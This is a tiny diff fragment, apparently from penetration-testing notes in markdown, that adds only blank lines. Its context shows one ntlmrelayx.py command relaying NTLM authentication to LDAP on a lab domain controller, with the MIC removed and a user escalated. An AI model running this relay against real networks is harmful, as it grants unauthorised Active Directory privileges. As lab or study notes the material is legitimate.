@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:36.992508+00:00'
 ```bash
 ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
 ```
+
+
